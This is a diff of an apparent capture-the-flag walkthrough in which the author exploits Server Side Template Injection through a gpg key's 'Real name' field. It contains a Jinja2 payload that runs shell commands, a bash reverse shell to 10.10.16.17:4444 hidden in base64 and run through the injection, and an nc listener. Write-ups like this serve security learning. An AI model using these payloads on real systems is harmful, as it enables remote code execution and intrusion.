@@ -44,8 +44,7 @@ gpg --gen-key
 ```
 
 #### First Try
-Try SSTI in real name field is vulnerable to SSTI (Server Side Template Injection). So for testing I put `{{7*7}}` payload in the name field. If it is vulnerable then it will give output `49` as a name.
-
+Try SSTI in real name field is vulnerable to SSTI (Server Side Template Injection). So for testing I put SSTI payload in the name field. If it is vulnerable then it will give output `49` as a name.
 ```
 Real name: {{7*7}}
 Email: anymail
@@ -103,7 +102,6 @@ Then I again generate keys but this time the payload will be different. In the n
 ```
 
 #### Second Try
-
 ```
 gpg --gen-key
 Real name: {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
@@ -144,7 +142,6 @@ echo "bash -i >& /dev/tcp/10.10.16.17/4444 0>&1" | base64
 Result: `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNy80NDQ0IDA+JjEK`
 
 The final payload:
-
 ```
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNy80NDQ0IDA+JjEK" | base64 -d | bash').read() }}
 ```
@@ -155,11 +152,9 @@ nc -nvlp 4444
 ```
 
 #### Third Try
-
 ```
 gpg --gen-key
 Real name: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNy80NDQ0IDA+JjEnCg==" | base64 -d | bash').read() }}
-
 Email: abdo@gmail.com
 password: A1234567 Admin123
 ```
